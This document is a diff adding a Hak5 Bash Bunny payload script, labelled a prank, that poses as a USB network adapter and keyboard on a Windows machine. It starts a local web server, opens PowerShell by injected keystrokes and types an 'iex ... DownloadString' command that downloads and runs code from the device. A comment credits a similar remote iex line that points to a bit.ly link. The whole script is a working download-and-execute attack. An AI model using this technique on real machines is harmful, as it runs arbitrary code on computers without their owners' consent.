@@ -1,0 +1,39 @@
+#!/bin/bash
+# Title:          Spinning Around
+# Description:    Spinning Ascii Hak5 Logo
+# Author:         Cribbit
+# Version:        1.0
+# Category:       Pranks
+# Target:         Windows (Powershell 5.1+)
+# Attackmodes:    RNDIS_ETHERNET HID
+# Props:          TW-D - inspiration, audibleblink - python server
+# Super mad Prop: Lee Holmes - Powershell Rickroll iex (New-Object Net.WebClient).DownloadString(“http://bit.ly/e0Mw9w")
+
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET HID
+
+GET SWITCH_POSITION
+GET HOST_IP
+
+
+cd /root/udisk/payloads/$SWITCH_POSITION/
+
+# starting server
+LED SPECIAL
+
+# disallow outgoing dns requests so server starts immediately
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+python -m SimpleHTTPServer 80 &
+
+# wait until port is listening
+while ! nc -z localhost 80; do sleep 0.2; done
+
+# attack commences
+LED ATTACK
+QUACK DELAY 200
+RUN WIN Powershell
+QUACK DELAY 500
+QUACK STRING "iex (New-Object Net.WebClient).DownloadString(\"http://$HOST_IP/spin\")"
+QUACK ENTER
+LED FINISH
+
